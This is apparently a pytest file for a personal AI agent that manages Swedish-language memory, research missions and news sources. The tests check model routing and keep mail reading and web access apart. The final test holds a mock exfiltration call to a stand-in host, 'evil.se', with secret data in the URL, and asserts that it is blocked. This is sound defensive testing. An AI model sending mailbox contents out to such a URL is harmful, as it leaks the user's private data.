import subprocess
from datetime import datetime
from zoneinfo import ZoneInfo

import pytest
import yaml

from agent import direction_ops as ops
from agent.claude_gate import ClaudeGate, RunResult
from agent.config import load_settings
from agent.db import Database
from agent.director import Director
from agent.inbox import Inbox
from agent.memory import MemoryRepo
from agent.schedule import Schedule

NOW = datetime(2026, 10, 10, 4, 15, tzinfo=ZoneInfo("Europe/Stockholm"))


@pytest.fixture
async def env(tmp_path, monkeypatch):
    mem = tmp_path / "memory"
    (mem / "direction" / "threads").mkdir(parents=True)
    (mem / "direction" / "now.md").write_text("# Nu\n")
    (mem / "profile.md").write_text("# Profil\nKTH\n")
    subprocess.run(["git", "init", "-q"], cwd=mem, check=True)
    research = tmp_path / "research.yaml"
    research.write_text("- id: jobs\n  goal: Hitta jobb\n  scope: Sthlm\n  interval_days: 1\n  enabled: true\n")
    sources = tmp_path / "sources.yaml"
    sources.write_text("streams:\n  - id: hn\n    type: rss\n    url: https://hn\n")
    monkeypatch.setattr(ops, "RESEARCH_FILE", research)
    monkeypatch.setattr(ops, "SOURCES_FILE", sources)
    from agent.config import instance_config

    instance_config("research.yaml").write_text(research.read_text())  # load_research reads the instance
    db = Database(tmp_path / "t.db")
    await db.open()
    yield db, MemoryRepo(mem), research, sources
    await db.close()


def director(db, memory, tmp_path, structured=None, calls=None):
    async def runner(task, ws, on_rl):
        if calls is not None:
            calls.append(task)
        return RunResult(text="", structured=structured)

    return Director(load_settings(), db, ClaudeGate(db, tmp_path, runner=runner), memory, Schedule(load_settings(), db, []))


BASE = {"person_md": None, "now_md": None, "goals_md": None, "log": ""}


async def test_apply_writes_direction_threads_missions_senses_questions_ideas(env, tmp_path):
    db, memory, research, sources = env
    d = director(db, memory, tmp_path)
    await Inbox(db).note("director", "jag söker en affärspartner till sidoprojektet", "partner behövs")
    changes = await d.apply({
        **BASE,
        "now_md": "# Nu\nTenta torsdag, flytt.",
        "goals_md": "# Mål\n1. Partner till sidoprojektet",
        "threads": [{"slug": "Partner", "status": "active", "content_md": "Mål: hitta affärspartner"}],
        "missions": [{"op": "add", "id": "partner", "goal": "Hitta affärspartner för studentstartup", "scope": "Uni/Sthlm", "reason": "tråd"}],
        "senses": [{"op": "add_page", "name": "Startup events", "url": "https://sses/events", "note": "matchning", "reason": "partner"}],
        "questions": [{"what": "Vilken sorts partner?", "why": "styr sökandet"}, {"what": "extra", "why": "x"}],
        "share": [{"title": "Pitcha appen på Startup", "brief": "Startup har en matchningskväll 20/10.", "url": "https://sses/x",
                   "why": "partner", "time_sensitivity": "medium", "expires": "2026-10-20"}],
        "log": "Startade partnertråden.",
    }, "understand", NOW)

    assert (memory.path / "direction" / "now.md").read_text().startswith("# Nu\nTenta")
    thread = (memory.path / "direction" / "threads" / "partner.md").read_text()
    assert thread.startswith("Status: active")
    assert [r["id"] for r in yaml.safe_load(research.read_text())] == ["jobs", "partner"]
    assert yaml.safe_load(sources.read_text())["streams"][-1]["url"] == "https://sses/events"
    assert [r["what"] for r in await db.fetchall("SELECT what FROM requests")] == ["Vilken sorts partner?"]
    idea = await db.fetchone("SELECT kind, status, url, expires_at FROM candidates")
    assert (idea["kind"], idea["status"], idea["url"]) == ("insight", "pending", "https://sses/x")
    assert idea["expires_at"].startswith("2026-10-20")
    assert await Inbox(db).unprocessed("director") == []
    assert "Startade partnertråden." in (memory.path / "direction" / "log.md").read_text()
    assert await memory.changed_files() == []
    assert any(c.startswith("idé till") for c in changes)


async def test_reflect_uses_opus_high_effort_with_web_and_understand_does_not(env, tmp_path):
    db, memory, *_ = env
    calls = []
    d = director(db, memory, tmp_path, structured=BASE, calls=calls)
    assert await d.run("understand") is not None
    assert await d.run("reflect") is not None
    u, r = calls
    assert (u.model, u.effort) == ("sonnet", None) and "WebSearch" not in u.allowed_tools
    assert (r.model, r.effort) == ("opus", "high") and "WebSearch" in r.allowed_tools
    assert "hidden assets" in r.prompt.lower() and "Profil" in r.prompt
    assert await db.kv_get("director.last_reflect") is not None



async def test_empty_person_md_triggers_first_picture_from_whole_history(env, tmp_path):
    db, memory, *_ = env
    (memory.path / "direction" / "person.md").write_text("# Personen\n\n## Vad hen vill\n<!-- kommentar -->\n")
    await db.execute("INSERT INTO messages (telegram_message_id, direction, text, created_at) VALUES (1, 'in', 'jag vill bygga saker som folk använder', datetime('now', '-20 days'))")
    calls = []
    d = director(db, memory, tmp_path, structured=BASE, calls=calls)
    await d.db.kv_set("director.last_understand", datetime.now().isoformat())  # last pass just now
    await d.run("understand")
    assert "person.md is empty" in calls[0].prompt and "folk använder" in calls[0].prompt

    (memory.path / "direction" / "person.md").write_text("# Personen\n\n## Vad hen vill\n- Bygga saker som används\n")
    await d.run("understand")
    assert "person.md är tom" not in calls[1].prompt and "folk använder" not in calls[1].prompt


class FakeMail:
    async def window(self):
        return "Mail (Gmail, read-only). [m1] från Spotify · Intervju"


class FakeWeb:
    async def stats(self):
        return ""


async def test_mail_and_the_web_are_never_in_the_same_director_run(env, tmp_path):
    db, memory, research, sources = env
    calls = []
    out = {**BASE, "senses": [
        {"op": "add_page", "name": "Spotify jobs", "url": "https://lifeatspotify.com/jobs", "reason": "nämnd i mejl"},
        {"op": "tune", "name": "hn", "poll_minutes": 120, "reason": "lugnt"},
    ]}
    d = director(db, memory, tmp_path, structured=out, calls=calls)
    d.mail, d.web = FakeMail(), FakeWeb()
    await d.run("understand")
    await d.run("reflect")
    u, r = calls
    assert "Intervju" in u.prompt and "mcp__mail__mail_read" in u.allowed_tools
    assert "mcp__web__web_read" not in u.allowed_tools  # read mail: no new web addresses
    assert "Intervju" not in r.prompt and not any("mail" in t for t in r.allowed_tools)
    assert "mcp__web__web_read" in r.allowed_tools
    assert "lifeatspotify.com" in r.prompt  # the daily review's URL proposal waits for the reflection to check it
    assert "lifeatspotify" not in sources.read_text().split("streams:")[1].split("- id: hn")[0]
    assert await db.kv_get("director.proposed_sources") is None  # cleared once the reflection has seen it


async def test_chat_turn_that_read_mail_cannot_reach_new_addresses():
    from agent.tools import TurnContext, build_mail_tools, build_web_tools
    import agent.tools as tools_mod

    class Reader:
        async def search(self, q, limit):
            return []

    class Web:
        async def read(self, url):
            return "page", "direct"

    captured = {}
    real = tools_mod.create_sdk_mcp_server

    def capture(name, version="1.0.0", tools=None):
        captured[name] = {t.name: t for t in tools}
        return real(name, version=version, tools=tools)

    tools_mod.create_sdk_mcp_server = capture
    try:
        turn = TurnContext()
        build_web_tools(Web(), turn)
        build_mail_tools(Reader(), turn)
    finally:
        tools_mod.create_sdk_mcp_server = real
    read = captured["web"]["web_read"].handler
    assert "page" in (await read({"url": "https://a.se"}))["content"][0]["text"]  # before mail: fine
    await captured["mail"]["mail_search"].handler({"query": "from:x"})
    assert "Not available after reading mail" in (await read({"url": "https://evil.se/?d=secret"}))["content"][0]["text"]
